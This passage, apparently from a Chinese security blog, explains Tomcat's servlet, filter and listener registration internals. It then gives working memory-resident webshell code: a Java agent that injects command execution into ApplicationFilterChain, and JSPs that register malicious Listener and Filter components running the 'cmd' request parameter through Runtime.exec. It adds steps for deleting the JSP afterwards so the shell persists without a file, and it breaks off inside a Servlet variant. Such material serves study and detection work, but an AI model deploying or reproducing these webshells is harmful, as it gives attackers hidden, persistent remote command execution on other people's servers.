i&lt;jspMappings.length; i++) &#123;                addServletMappingDecoded(jspMappings[i], child.getName());            &#125;        &#125;    &#125;\n\n\naddServletMappingDecoded\nservletMappings是一个HashMap类型的变量，存储了servletPath和servletName的键值对关系，addServletMappingDecoded函数实现了将servletPath和servletName添加为一个映射的功能；\n1234567891011121314151617181920212223242526public void addServletMappingDecoded(String pattern, String name,                                  boolean jspWildCard) &#123;        // Validate the proposed mapping        if (findChild(name) == null)            throw new IllegalArgumentException                (sm.getString(&quot;standardContext.servletMap.name&quot;, name));        String adjustedPattern = adjustURLPattern(pattern);        if (!validateURLPattern(adjustedPattern))            throw new IllegalArgumentException                (sm.getString(&quot;standardContext.servletMap.pattern&quot;, adjustedPattern));        // Add this mapping to our registered set        synchronized (servletMappingsLock) &#123;            String name2 = servletMappings.get(adjustedPattern);            if (name2 != null) &#123;                // Don&#x27;t allow more than one servlet on the same pattern                Wrapper wrapper = (Wrapper) findChild(name2);                wrapper.removeMapping(adjustedPattern);            &#125;            servletMappings.put(adjustedPattern, name);        &#125;        Wrapper wrapper = (Wrapper) findChild(name);        wrapper.addMapping(adjustedPattern);        fireContainerEvent(&quot;addServletMapping&quot;, adjustedPattern);    &#125;\n\nFilterMapWeb 应用程序的filter映射，如部署描述符中&lt;filter-mapping&gt;元素所表示，FilterMap提供了一些方法用来添加filter映射关系。\n\naddURLPattern\n添加映射匹配的URL\n123public void addURLPattern(String urlPattern) &#123;        addURLPatternDecoded(UDecoder.URLDecode(urlPattern, getCharset()));    &#125;\nsetFilterName\n设置FilterName\n123public void setFilterName(String filterName) &#123;    this.filterName = filterName;&#125;\nsetDispatcher\n此方法将用于设置 FilterMap 的当前状态，表示应应用过滤器的状态\n1234567891011121314151617181920212223242526/** * This method will be used to set the current state of the FilterMap * representing the state of when filters should be applied. * @param dispatcherString the dispatcher type which should *  match this filter */public void setDispatcher(String dispatcherString) &#123;    String dispatcher = dispatcherString.toUpperCase(Locale.ENGLISH);    if (dispatcher.equals(DispatcherType.FORWARD.name())) &#123;        // apply FORWARD to the global dispatcherMapping.        dispatcherMapping |= FORWARD;    &#125; else if (dispatcher.equals(DispatcherType.INCLUDE.name())) &#123;        // apply INCLUDE to the global dispatcherMapping.        dispatcherMapping |= INCLUDE;    &#125; else if (dispatcher.equals(DispatcherType.REQUEST.name())) &#123;        // apply REQUEST to the global dispatcherMapping.        dispatcherMapping |= REQUEST;    &#125;  else if (dispatcher.equals(DispatcherType.ERROR.name())) &#123;        // apply ERROR to the global dispatcherMapping.        dispatcherMapping |= ERROR;    &#125;  else if (dispatcher.equals(DispatcherType.ASYNC.name())) &#123;        // apply ERROR to the global dispatcherMapping.        dispatcherMapping |= ASYNC;    &#125;&#125;\n\nFilterDefWeb 应用程序的filter定义，如部署描述符中的 &lt;filter&gt; 元素所示，FilterDef提供了一些方法用来设置filter定义。\n\nsetFilter\n设置Filter\n123456789101112/** * The filter instance associated with this definition */private transient Filter filter = null;public Filter getFilter() &#123;    return filter;&#125;public void setFilter(Filter filter) &#123;    this.filter = filter;&#125;\nsetFilterName\n设置Filter名\n1234567891011121314151617/** * The name of this filter, which must be unique among the filters * defined for a particular web application. */private String filterName = null;public String getFilterName() &#123;    return (this.filterName);&#125;public void setFilterName(String filterName) &#123;    if (filterName == null || filterName.equals(&quot;&quot;)) &#123;        throw new IllegalArgumentException(                sm.getString(&quot;filterDef.invalidFilterName&quot;, filterName));    &#125;    this.filterName = filterName;&#125;\nsetFilterClass\n设置Filter类\n123456789101112/** * The fully qualified name of the Java class that implements this filter. */private String filterClass = null;public String getFilterClass() &#123;    return (this.filterClass);&#125;public void setFilterClass(String filterClass) &#123;    this.filterClass = filterClass;&#125;\n\n内存马Agent型内存马在Container请求处理流程源码分析中，我们知道在调用过滤器链时，会调用ApplicationFilterChain类的doFilter方法,doFilter方法它会将处理委托给internalDoFilter方法，pos和n是ApplicationFilterChain的成员变量，分别表示过滤器链的当前位置和过滤器总数，所以当pos小于n时，会不断执行ApplicationFilterChain的doFilter方法，因此我们可以用internalDoFilter方法作为内存马入口方法。\n1、定义AgentMain，TransformerDemo，在定义一个readSource方法来读取恶意代码。\n123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172package org.example;import javassist.*;import java.io.BufferedReader;import java.io.InputStream;import java.io.InputStreamReader;import java.lang.instrument.ClassFileTransformer;import java.lang.instrument.IllegalClassFormatException;import java.lang.instrument.Instrumentation;import java.lang.instrument.UnmodifiableClassException;import java.security.ProtectionDomain;public class AgentMain &#123;    public static void agentmain(String agentArgs, Instrumentation inst) throws UnmodifiableClassException &#123;        System.out.println(&quot;agentmain invoke ! ! !&quot;);        Class[] classes = inst.getAllLoadedClasses();        for (Class aClass : classes) &#123;            if (aClass.getName().equals(&quot;org.apache.catalina.core.ApplicationFilterChain&quot;)) &#123;                inst.addTransformer(new TransformerDemo(), true);                inst.retransformClasses(aClass);            &#125;        &#125;    &#125;&#125;class TransformerDemo implements ClassFileTransformer &#123;    @Override    public byte[] transform(ClassLoader loader, String className, Class&lt;?&gt; classBeingRedefined, ProtectionDomain protectionDomain, byte[] classfileBuffer) throws IllegalClassFormatException &#123;        try &#123;            ClassPool cp = ClassPool.getDefault();            ClassClassPath classPath = new ClassClassPath(classBeingRedefined);            cp.insertClassPath(classPath);            CtClass ctc = cp.get(&quot;org.apache.catalina.core.ApplicationFilterChain&quot;);            CtMethod method = ctc.getDeclaredMethod(&quot;internalDoFilter&quot;);            String source = readSource();            method.insertBefore(source);            byte[] bytes = ctc.toBytecode();            ctc.detach();            return bytes;        &#125; catch (Exception e)&#123;            e.printStackTrace();        &#125;        return classfileBuffer;    &#125;    public static String readSource() &#123;        StringBuilder source=new StringBuilder();        InputStream is = TransformerDemo.class.getClassLoader().getResourceAsStream(&quot;source.txt&quot;);        InputStreamReader isr = new InputStreamReader(is);        String line=null;        try &#123;            BufferedReader br = new BufferedReader(isr);            while((line=br.readLine()) != null) &#123;                source.append(line);            &#125;        &#125; catch (Exception e) &#123;            e.printStackTrace();        &#125;        return source.toString();    &#125;&#125;\n\n2、source.txt \n12345678910111213141516171819202122232425262728293031323334\tjavax.servlet.http.HttpServletRequest request=$1;\tjavax.servlet.http.HttpServletResponse response = $2;\tString pass=request.getParameter(&quot;pass&quot;);\tString model=request.getParameter(&quot;model&quot;);\tString result=&quot;&quot;;try &#123;\t\t\tif (pass!=null&amp;&amp;pass.equals(&quot;self&quot;))\t\t\t&#123;\t\t\t\tif (model.equals(&quot;exec&quot;))\t\t\t\t&#123;\t\t\t\t\tString cmd=request.getParameter(&quot;cmd&quot;);\t\t\t\t\tif (cmd != null &amp;&amp; cmd.length() &gt; 0) &#123;\t\t\t\t\t\tProcess p = Runtime.getRuntime().exec(cmd);\t\t\t\t\t\tjava.io.OutputStream os = p.getOutputStream();\t\t\t\t\t\tjava.io.InputStream in = p.getInputStream();\t\t\t\t\t\tjava.io.DataInputStream dis = new java.io.DataInputStream(in);\t\t\t\t\t\tString disr = dis.readLine();\t\t\t\t\t\twhile (disr != null) &#123;\t\t\t\t\t\t\tresult = result + disr + &quot;\\n&quot;;\t\t\t\t\t\t\tdisr = dis.readLine();\t\t\t\t\t\t&#125;\t\t\t\t\t&#125;\t\t\t\t&#125;\t\t\t\tresponse.getWriter().print(result);\t\t\t\treturn;\t\t\t&#125;\t\t\t\t\t&#125;\t\tcatch(Exception e)\t\t&#123;\t\t\tresponse.getWriter().print(e.getMessage());\t\t&#125;\n\n3、编译成AgentMain.jar，使用解压软件打开jar包，将source.txt复杂到jar包内\n\n4、启动tomcat，然后启动attachmain\n\n\n\n5、访问任意路由，带上这些参数pass=self&amp;model=exec&amp;cmd=ipconfig\n\n获取StandardContext对象参考：https://xz.aliyun.com/t/9914\nservlet规范型内存马是动态注册符合servlet规范的自定义恶意组件到web容器中，servlet规范型内存马都是基于修改StandardContext实现的。\nbitterz师傅将获取StandardContext对象的方法总结在了一起，我这里仅展示实现代码，详情查看https://xz.aliyun.com/t/9914\n1、从request对象可以获取servletContext再一步一步获取standardContext。（需要request）\n123456789javax.servlet.ServletContext servletContext = request.getServletContext();对象Field appctx = servletContext.getClass().getDeclaredField(&quot;context&quot;);  // 获取属性appctx.setAccessible(true);ApplicationContext applicationContext = (ApplicationContext) appctx.get(servletContext);  //从servletContext中获取context属性-&gt;applicationContextField stdctx = applicationContext.getClass().getDeclaredField(&quot;context&quot;);  // 获取属性stdctx.setAccessible(true);StandardContext standardContext = (StandardContext) stdctx.get(applicationContext);  // 从applicationContext中获取context属性-&gt;standardContext，applicationContext构造时需要传入standardContext\n\n2、从ContextClassLoader获取servletContext（限制在于只可用于Tomcat 8 9）\n123org.apache.catalina.loader.WebappClassLoaderBase webappClassLoaderBase =(org.apache.catalina.loader.WebappClassLoaderBase) Thread.currentThread().getContextClassLoader();StandardContext standardContext = (StandardContext)webappClassLoaderBase.getResources().getContext();\t\t\t\n\n3、遍历thread数组获取servletContext（Tomcat全版本）\n123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139&lt;%@ page contentType=&quot;text/html;charset=UTF-8&quot; language=&quot;java&quot; %&gt;&lt;%@ page import=&quot;org.apache.catalina.core.StandardContext&quot;%&gt;&lt;%@ page import=&quot;org.apache.catalina.core.StandardEngine&quot;%&gt;&lt;%@ page import=&quot;org.apache.catalina.core.StandardHost&quot;%&gt;&lt;%@ page import=&quot;java.lang.reflect.Field&quot;%&gt;&lt;%@ page import=&quot;java.util.HashMap&quot;%&gt;&lt;%@ page import=&quot;java.util.Iterator&quot;%&gt;&lt;%class Tomcat6789 &#123;    String uri;    String serverName;    StandardContext standardContext;    public Object getField(Object object, String fieldName) &#123;        Field declaredField;        Class clazz = object.getClass();        while (clazz != Object.class) &#123;            try &#123;                declaredField = clazz.getDeclaredField(fieldName);                declaredField.setAccessible(true);                return declaredField.get(object);            &#125; catch (NoSuchFieldException e)&#123;&#125;            catch (IllegalAccessException e)&#123;&#125;            clazz = clazz.getSuperclass();        &#125;        return null;    &#125;    public Tomcat6789() &#123;        Thread[] threads = (Thread[]) this.getField(Thread.currentThread().getThreadGroup(), &quot;threads&quot;);        Object object;        for (Thread thread : threads) &#123;            if (thread == null) &#123;                continue;            &#125;            if (thread.getName().contains(&quot;exec&quot;)) &#123;                continue;            &#125;            Object target = this.getField(thread, &quot;target&quot;);            if (!(target instanceof Runnable)) &#123;                continue;            &#125;            try &#123;                object = getField(getField(getField(target, &quot;this$0&quot;), &quot;handler&quot;), &quot;global&quot;);            &#125; catch (Exception e) &#123;                continue;            &#125;            if (object == null) &#123;                continue;            &#125;            java.util.ArrayList processors = (java.util.ArrayList) getField(object, &quot;processors&quot;);            Iterator iterator = processors.iterator();            while (iterator.hasNext()) &#123;                Object next = iterator.next();                Object req = getField(next, &quot;req&quot;);                Object serverPort = getField(req, &quot;serverPort&quot;);                if (serverPort.equals(-1))&#123;continue;&#125;                org.apache.tomcat.util.buf.MessageBytes serverNameMB = (org.apache.tomcat.util.buf.MessageBytes) getField(req, &quot;serverNameMB&quot;);                this.serverName = (String) getField(serverNameMB, &quot;strValue&quot;);                if (this.serverName == null)&#123;                    this.serverName = serverNameMB.toString();                &#125;                if (this.serverName == null)&#123;                    this.serverName = serverNameMB.getString();                &#125;                org.apache.tomcat.util.buf.MessageBytes uriMB = (org.apache.tomcat.util.buf.MessageBytes) getField(req, &quot;uriMB&quot;);                this.uri = (String) getField(uriMB, &quot;strValue&quot;);                if (this.uri == null)&#123;                    this.uri = uriMB.toString();                &#125;                if (this.uri == null)&#123;                    this.uri = uriMB.getString();                &#125;                this.getStandardContext();                return;            &#125;        &#125;    &#125;    public void getStandardContext() &#123;        Thread[] threads = (Thread[]) this.getField(Thread.currentThread().getThreadGroup(), &quot;threads&quot;);        for (Thread thread : threads) &#123;            if (thread == null) &#123;                continue;            &#125;            if ((thread.getName().contains(&quot;Acceptor&quot;)) &amp;&amp; (thread.getName().contains(&quot;http&quot;))) &#123;                Object target = this.getField(thread, &quot;target&quot;);                HashMap children;                Object jioEndPoint = null;                try &#123;                    jioEndPoint = getField(target, &quot;this$0&quot;);                &#125;catch (Exception e)&#123;&#125;                if (jioEndPoint == null)&#123;                    try&#123;                        jioEndPoint = getField(target, &quot;endpoint&quot;);                    &#125;catch (Exception e)&#123; return; &#125;                &#125;                Object service = getField(getField(getField(getField(getField(jioEndPoint, &quot;handler&quot;), &quot;proto&quot;), &quot;adapter&quot;), &quot;connector&quot;), &quot;service&quot;);                StandardEngine engine = null;                try &#123;                    engine = (StandardEngine) getField(service, &quot;container&quot;);                &#125;catch (Exception e)&#123;&#125;                if (engine == null)&#123;                    engine = (StandardEngine) getField(service, &quot;engine&quot;);                &#125;                children = (HashMap) getField(engine, &quot;children&quot;);                StandardHost standardHost = (StandardHost) children.get(this.serverName);                children = (HashMap) getField(standardHost, &quot;children&quot;);                Iterator iterator = children.keySet().iterator();                while (iterator.hasNext())&#123;                    String contextKey = (String) iterator.next();                    if (!(this.uri.startsWith(contextKey)))&#123;continue;&#125;                    StandardContext standardContext = (StandardContext) children.get(contextKey);                    this.standardContext = standardContext;                    return;                &#125;            &#125;        &#125;    &#125;    public StandardContext getSTC()&#123;        return this.standardContext;    &#125;&#125;%&gt;&lt;%//获取StandardContext对象Tomcat6789 a = new Tomcat6789();StandardContext standardContext = a.getSTC()%&gt;\n\n\n\nListener内存马实现Listener内存马实现非常简单，只需调用addApplicationEventListener方法注入一个listener对象即可\n\n获取StandardContext对象\n构造listener对象\n将listener添加到初始化的应用程序事件侦听器列表的末尾\n\n123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187&lt;%@ page contentType=&quot;text/html;charset=UTF-8&quot; language=&quot;java&quot; %&gt;&lt;%@ page import=&quot;org.apache.catalina.core.StandardContext&quot;%&gt;&lt;%@ page import=&quot;org.apache.catalina.core.StandardEngine&quot;%&gt;&lt;%@ page import=&quot;org.apache.catalina.core.StandardHost&quot;%&gt;&lt;%@ page import=&quot;java.lang.reflect.Field&quot;%&gt;&lt;%@ page import=&quot;java.util.HashMap&quot;%&gt;&lt;%@ page import=&quot;java.util.Iterator&quot;%&gt;&lt;%@ page import=&quot;java.lang.reflect.Field&quot; %&gt;&lt;%@ page import=&quot;org.apache.catalina.core.ApplicationContext&quot; %&gt;&lt;%@ page import=&quot;org.apache.catalina.core.StandardContext&quot; %&gt;&lt;%@ page import=&quot;java.io.InputStream&quot; %&gt;&lt;%@ page import=&quot;java.util.Scanner&quot; %&gt;&lt;%@ page import=&quot;java.io.PrintWriter&quot; %&gt;&lt;%@ page import=&quot;java.io.IOException&quot; %&gt;&lt;%@ page import=&quot;org.apache.catalina.connector.Request&quot; %&gt;&lt;%class Tomcat6789 &#123;    String uri;    String serverName;    StandardContext standardContext;    public Object getField(Object object, String fieldName) &#123;        Field declaredField;        Class clazz = object.getClass();        while (clazz != Object.class) &#123;            try &#123;                declaredField = clazz.getDeclaredField(fieldName);                declaredField.setAccessible(true);                return declaredField.get(object);            &#125; catch (NoSuchFieldException e)&#123;&#125;            catch (IllegalAccessException e)&#123;&#125;            clazz = clazz.getSuperclass();        &#125;        return null;    &#125;    public Tomcat6789() &#123;        Thread[] threads = (Thread[]) this.getField(Thread.currentThread().getThreadGroup(), &quot;threads&quot;);        Object object;        for (Thread thread : threads) &#123;            if (thread == null) &#123;                continue;            &#125;            if (thread.getName().contains(&quot;exec&quot;)) &#123;                continue;            &#125;            Object target = this.getField(thread, &quot;target&quot;);            if (!(target instanceof Runnable)) &#123;                continue;            &#125;            try &#123;                object = getField(getField(getField(target, &quot;this$0&quot;), &quot;handler&quot;), &quot;global&quot;);            &#125; catch (Exception e) &#123;                continue;            &#125;            if (object == null) &#123;                continue;            &#125;            java.util.ArrayList processors = (java.util.ArrayList) getField(object, &quot;processors&quot;);            Iterator iterator = processors.iterator();            while (iterator.hasNext()) &#123;                Object next = iterator.next();                Object req = getField(next, &quot;req&quot;);                Object serverPort = getField(req, &quot;serverPort&quot;);                if (serverPort.equals(-1))&#123;continue;&#125;                org.apache.tomcat.util.buf.MessageBytes serverNameMB = (org.apache.tomcat.util.buf.MessageBytes) getField(req, &quot;serverNameMB&quot;);                this.serverName = (String) getField(serverNameMB, &quot;strValue&quot;);                if (this.serverName == null)&#123;                    this.serverName = serverNameMB.toString();                &#125;                if (this.serverName == null)&#123;                    this.serverName = serverNameMB.getString();                &#125;                org.apache.tomcat.util.buf.MessageBytes uriMB = (org.apache.tomcat.util.buf.MessageBytes) getField(req, &quot;uriMB&quot;);                this.uri = (String) getField(uriMB, &quot;strValue&quot;);                if (this.uri == null)&#123;                    this.uri = uriMB.toString();                &#125;                if (this.uri == null)&#123;                    this.uri = uriMB.getString();                &#125;                this.getStandardContext();                return;            &#125;        &#125;    &#125;    public void getStandardContext() &#123;        Thread[] threads = (Thread[]) this.getField(Thread.currentThread().getThreadGroup(), &quot;threads&quot;);        for (Thread thread : threads) &#123;            if (thread == null) &#123;                continue;            &#125;            if ((thread.getName().contains(&quot;Acceptor&quot;)) &amp;&amp; (thread.getName().contains(&quot;http&quot;))) &#123;                Object target = this.getField(thread, &quot;target&quot;);                HashMap children;                Object jioEndPoint = null;                try &#123;                    jioEndPoint = getField(target, &quot;this$0&quot;);                &#125;catch (Exception e)&#123;&#125;                if (jioEndPoint == null)&#123;                    try&#123;                        jioEndPoint = getField(target, &quot;endpoint&quot;);                    &#125;catch (Exception e)&#123; return; &#125;                &#125;                Object service = getField(getField(getField(getField(getField(jioEndPoint, &quot;handler&quot;), &quot;proto&quot;), &quot;adapter&quot;), &quot;connector&quot;), &quot;service&quot;);                StandardEngine engine = null;                try &#123;                    engine = (StandardEngine) getField(service, &quot;container&quot;);                &#125;catch (Exception e)&#123;&#125;                if (engine == null)&#123;                    engine = (StandardEngine) getField(service, &quot;engine&quot;);                &#125;                children = (HashMap) getField(engine, &quot;children&quot;);                StandardHost standardHost = (StandardHost) children.get(this.serverName);                children = (HashMap) getField(standardHost, &quot;children&quot;);                Iterator iterator = children.keySet().iterator();                while (iterator.hasNext())&#123;                    String contextKey = (String) iterator.next();                    if (!(this.uri.startsWith(contextKey)))&#123;continue;&#125;                    StandardContext standardContext = (StandardContext) children.get(contextKey);                    this.standardContext = standardContext;                    return;                &#125;            &#125;        &#125;    &#125;    public StandardContext getSTC()&#123;        return this.standardContext;    &#125;&#125;%&gt;&lt;%    try &#123;        //获取StandardContext对象\t\tTomcat6789 a = new Tomcat6789();\t\tStandardContext standardContext = a.getSTC();                //构造listener对象        ServletRequestListener listener = new ServletRequestListener() &#123;            @Override            public void requestDestroyed(ServletRequestEvent sre) &#123;                HttpServletRequest req = (HttpServletRequest) sre.getServletRequest();                String cmd = req.getParameter(&quot;cmd&quot;);                if (cmd != null)&#123;                    try &#123;                        InputStream in = Runtime.getRuntime().exec(cmd).getInputStream();                        Scanner s = new Scanner(in).useDelimiter(&quot;\\\\A&quot;);                        String output = s.hasNext() ? s.next() : &quot;&quot;;                        Field requestF = req.getClass().getDeclaredField(&quot;request&quot;);                        requestF.setAccessible(true);                        Request request = (Request)requestF.get(req);                        PrintWriter out= request.getResponse().getWriter();                        out.println(output);                        out.flush();                        out.close();                    &#125;                    catch (Exception e) &#123;&#125;                &#125;            &#125;            @Override            public void requestInitialized(ServletRequestEvent sre) &#123;&#125;        &#125;;\t\t//将listener添加到初始化的应用程序事件侦听器列表的末尾        standardContext.addApplicationEventListener(listener);            &#125; catch (Exception e) &#123;        e.printStackTrace();    &#125;%&gt;\n\n访问注入内存马的jsp文件，然后删除jsp文件，访问任意路由，添加cmd参数执行命令\n\nFilter内存马实现\n获取filterConfigs\n创建恶意filter\n获取FilterDef对象并设置filter、filterName和filterClass\n调用addFilterDef为Context添加一个Filter定义\n获取FilterMap并设置其URLPattern、FilterName和Dispatcher\n添加一个Filter映射到这个Context\n获取ApplicationFilterConfig，注入filterDef\n\n123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225&lt;%@ page contentType=&quot;text/html;charset=UTF-8&quot; language=&quot;java&quot; %&gt;&lt;%@ page import=&quot;org.apache.catalina.core.StandardContext&quot;%&gt;&lt;%@ page import=&quot;org.apache.catalina.core.StandardEngine&quot;%&gt;&lt;%@ page import=&quot;org.apache.catalina.core.StandardHost&quot;%&gt;&lt;%@ page import=&quot;java.lang.reflect.Field&quot;%&gt;&lt;%@ page import=&quot;java.util.HashMap&quot;%&gt;&lt;%@ page import=&quot;java.util.Iterator&quot;%&gt;&lt;%@ page import=&quot;java.lang.reflect.Field&quot; %&gt;&lt;%@ page import=&quot;java.util.Map&quot; %&gt;&lt;%@ page import=&quot;org.apache.catalina.core.ApplicationContext&quot; %&gt;&lt;%@ page import=&quot;org.apache.catalina.core.StandardContext&quot; %&gt;&lt;%@ page import=&quot;java.io.IOException&quot; %&gt;&lt;%@ page import=&quot;java.io.InputStream&quot; %&gt;&lt;%@ page import=&quot;java.util.Scanner&quot; %&gt;&lt;%@ page import=&quot;java.lang.reflect.Constructor&quot; %&gt;&lt;%@ page import=&quot;org.apache.tomcat.util.descriptor.web.FilterDef&quot; %&gt;&lt;%@ page import=&quot;org.apache.tomcat.util.descriptor.web.FilterMap&quot; %&gt;&lt;%@ page import=&quot;org.apache.catalina.Context&quot; %&gt;&lt;%@ page import=&quot;org.apache.catalina.core.ApplicationFilterConfig&quot; %&gt;&lt;%@ page import=&quot;java.io.PrintWriter&quot; %&gt;&lt;%    class Tomcat6789 &#123;        String uri;        String serverName;        StandardContext standardContext;        public Object getField(Object object, String fieldName) &#123;            Field declaredField;            Class clazz = object.getClass();            while (clazz != Object.class) &#123;                try &#123;                    declaredField = clazz.getDeclaredField(fieldName);                    declaredField.setAccessible(true);                    return declaredField.get(object);                &#125; catch (NoSuchFieldException e)&#123;&#125;                catch (IllegalAccessException e)&#123;&#125;                clazz = clazz.getSuperclass();            &#125;            return null;        &#125;        public Tomcat6789() &#123;            Thread[] threads = (Thread[]) this.getField(Thread.currentThread().getThreadGroup(), &quot;threads&quot;);            Object object;            for (Thread thread : threads) &#123;                if (thread == null) &#123;                    continue;                &#125;                if (thread.getName().contains(&quot;exec&quot;)) &#123;                    continue;                &#125;                Object target = this.getField(thread, &quot;target&quot;);                if (!(target instanceof Runnable)) &#123;                    continue;                &#125;                try &#123;                    object = getField(getField(getField(target, &quot;this$0&quot;), &quot;handler&quot;), &quot;global&quot;);                &#125; catch (Exception e) &#123;                    continue;                &#125;                if (object == null) &#123;                    continue;                &#125;                java.util.ArrayList processors = (java.util.ArrayList) getField(object, &quot;processors&quot;);                Iterator iterator = processors.iterator();                while (iterator.hasNext()) &#123;                    Object next = iterator.next();                    Object req = getField(next, &quot;req&quot;);                    Object serverPort = getField(req, &quot;serverPort&quot;);                    if (serverPort.equals(-1))&#123;continue;&#125;                    org.apache.tomcat.util.buf.MessageBytes serverNameMB = (org.apache.tomcat.util.buf.MessageBytes) getField(req, &quot;serverNameMB&quot;);                    this.serverName = (String) getField(serverNameMB, &quot;strValue&quot;);                    if (this.serverName == null)&#123;                        this.serverName = serverNameMB.toString();                    &#125;                    if (this.serverName == null)&#123;                        this.serverName = serverNameMB.getString();                    &#125;                    org.apache.tomcat.util.buf.MessageBytes uriMB = (org.apache.tomcat.util.buf.MessageBytes) getField(req, &quot;uriMB&quot;);                    this.uri = (String) getField(uriMB, &quot;strValue&quot;);                    if (this.uri == null)&#123;                        this.uri = uriMB.toString();                    &#125;                    if (this.uri == null)&#123;                        this.uri = uriMB.getString();                    &#125;                    this.getStandardContext();                    return;                &#125;            &#125;        &#125;        public void getStandardContext() &#123;            Thread[] threads = (Thread[]) this.getField(Thread.currentThread().getThreadGroup(), &quot;threads&quot;);            for (Thread thread : threads) &#123;                if (thread == null) &#123;                    continue;                &#125;                if ((thread.getName().contains(&quot;Acceptor&quot;)) &amp;&amp; (thread.getName().contains(&quot;http&quot;))) &#123;                    Object target = this.getField(thread, &quot;target&quot;);                    HashMap children;                    Object jioEndPoint = null;                    try &#123;                        jioEndPoint = getField(target, &quot;this$0&quot;);                    &#125;catch (Exception e)&#123;&#125;                    if (jioEndPoint == null)&#123;                        try&#123;                            jioEndPoint = getField(target, &quot;endpoint&quot;);                        &#125;catch (Exception e)&#123; return; &#125;                    &#125;                    Object service = getField(getField(getField(getField(getField(jioEndPoint, &quot;handler&quot;), &quot;proto&quot;), &quot;adapter&quot;), &quot;connector&quot;), &quot;service&quot;);                    StandardEngine engine = null;                    try &#123;                        engine = (StandardEngine) getField(service, &quot;container&quot;);                    &#125;catch (Exception e)&#123;&#125;                    if (engine == null)&#123;                        engine = (StandardEngine) getField(service, &quot;engine&quot;);                    &#125;                    children = (HashMap) getField(engine, &quot;children&quot;);                    StandardHost standardHost = (StandardHost) children.get(this.serverName);                    children = (HashMap) getField(standardHost, &quot;children&quot;);                    Iterator iterator = children.keySet().iterator();                    while (iterator.hasNext())&#123;                        String contextKey = (String) iterator.next();                        if (!(this.uri.startsWith(contextKey)))&#123;continue;&#125;                        StandardContext standardContext = (StandardContext) children.get(contextKey);                        this.standardContext = standardContext;                        return;                    &#125;                &#125;            &#125;        &#125;        public StandardContext getSTC()&#123;            return this.standardContext;        &#125;    &#125;%&gt;&lt;%    try &#123;        //获取StandardContext对象        Tomcat6789 a = new Tomcat6789();        StandardContext standardContext = a.getSTC();        //// 获取filterConfigs        Field Configs = standardContext.getClass().getDeclaredField(&quot;filterConfigs&quot;);        Configs.setAccessible(true);        Map filterConfigs = (Map) Configs.get(standardContext);        //创建恶意filter        String FilterName = &quot;CmdFilter&quot;;        Filter filter = new Filter() &#123;            @Override            public void init(FilterConfig filterConfig) &#123;&#125;            @Override            public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain) throws IOException, ServletException &#123;                HttpServletRequest req = (HttpServletRequest) servletRequest;                if (req.getParameter(&quot;cmd&quot;) != null) &#123;                    InputStream in = Runtime.getRuntime().exec(req.getParameter(&quot;cmd&quot;)).getInputStream();                    Scanner s = new Scanner(in).useDelimiter(&quot;\\\\A&quot;);                    String output = s.hasNext() ? s.next() : &quot;&quot;;                    servletResponse.getWriter().write(output);                    PrintWriter out = servletResponse.getWriter();                    out.println(output);                    out.flush();                    out.close();                &#125;                filterChain.doFilter(servletRequest, servletResponse);            &#125;            @Override            public void destroy() &#123;&#125;        &#125;;        //获取FilterDef对象并设置filter、filterName和filterClass        Class&lt;?&gt; FilterDef = Class.forName(&quot;org.apache.tomcat.util.descriptor.web.FilterDef&quot;);        Constructor declaredConstructor1 = FilterDef.getDeclaredConstructor();        org.apache.tomcat.util.descriptor.web.FilterDef filterDef = (FilterDef) declaredConstructor1.newInstance();        filterDef.setFilter(filter);        filterDef.setFilterName(FilterName);        filterDef.setFilterClass(filter.getClass().getName());        // 调用addFilterDef为Context添加一个Filter定义        standardContext.addFilterDef(filterDef);        //获取FilterMap并设置其URLPattern、FilterName和Dispatcher        Class&lt;?&gt; FilterMap = Class.forName(&quot;org.apache.tomcat.util.descriptor.web.FilterMap&quot;);        Constructor&lt;?&gt; declaredConstructor = FilterMap.getDeclaredConstructor();        org.apache.tomcat.util.descriptor.web.FilterMap filterMap = (FilterMap) declaredConstructor.newInstance();        filterMap.addURLPattern(&quot;/*&quot;);        filterMap.setFilterName(FilterName);        filterMap.setDispatcher(DispatcherType.REQUEST.name());        //添加一个Filter映射到这个Context        standardContext.addFilterMap(filterMap);        //获取ApplicationFilterConfig，注入filterDef        Class&lt;?&gt; ApplicationFilterConfig = Class.forName(&quot;org.apache.catalina.core.ApplicationFilterConfig&quot;);        Constructor&lt;?&gt; declaredConstructor2 = ApplicationFilterConfig.getDeclaredConstructor(Context.class, FilterDef.class);        declaredConstructor2.setAccessible(true);        org.apache.catalina.core.ApplicationFilterConfig filterConfig = (ApplicationFilterConfig) declaredConstructor2.newInstance(standardContext, filterDef);        filterConfigs.put(FilterName, filterConfig);    &#125; catch (Exception e) &#123;        e.printStackTrace();    &#125;%&gt;\n\n访问注入内存马的jsp文件，然后删除jsp文件，访问任意路由，添加cmd参数执行命令\n\nservlet内存马实现\n创建恶意servlet\n创建wrapper，设置恶意servlet\n添加到children容器中\n设置servlet映射\n\n123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200&lt;%@ page contentType=&quot;text/html;charset=UTF-8&quot; language=&quot;java&quot; %&gt;&lt;%@ page import=&quot;org.apache.catalina.core.StandardContext&quot;%&gt;&lt;%@ page import=&quot;org.apache.catalina.core.StandardEngine&quot;%&gt;&lt;%@ page import=&quot;org.apache.catalina.core.StandardHost&quot;%&gt;&lt;%@ page import=&quot;java.lang.reflect.Field&quot;%&gt;&lt;%@ page import=&quot;java.util.HashMap&quot;%&gt;&lt;%@ page 